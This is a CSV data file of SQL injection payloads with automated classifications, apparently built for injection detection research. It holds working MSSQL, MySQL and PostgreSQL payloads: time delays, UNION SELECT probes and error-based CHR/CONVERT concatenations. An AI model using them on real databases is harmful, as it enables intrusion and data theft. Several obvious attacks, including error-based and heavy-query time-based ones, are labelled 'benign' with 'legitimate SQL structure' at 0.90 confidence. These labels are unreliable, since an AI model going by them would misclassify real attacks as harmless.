id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
25144,waitfor delay '0:0:5' ) ||',time_blind,mssql,0.85,Signal match: waitfor delay → time_blind (P5); DB signature: mssql,1
25145,"-9569%' ) ) union all select 8405,8405,8405,8405--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25146,"-5755"" or 3581 = 7566",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25147,"1"" ) ) ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( ""fktl"" = ""fktl",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25148,"-7084%' union all select 5727,5727,5727,5727,5727,5727,5727,5727,5727,5727--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25149,"1 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) -- viti",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25150,1' and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and 'ukzb' = 'ukzb,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25151,"1' ) where 2802 = 2802 union all select null,null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25152,1 ) ) as myxo where 1759 = 1759 union all select null#,union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25153,"1"" ) ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( ""ksxz"" = ""ksxz",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25154,select ( case when ( 3168 = 5577 ) then 3168 else 3168* ( select 3168 from mysql.db ) end ) #,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25155,1 ) waitfor delay '0:0:5',time_blind,mssql,0.85,Signal match: waitfor delay → time_blind (P5); DB signature: mssql,1
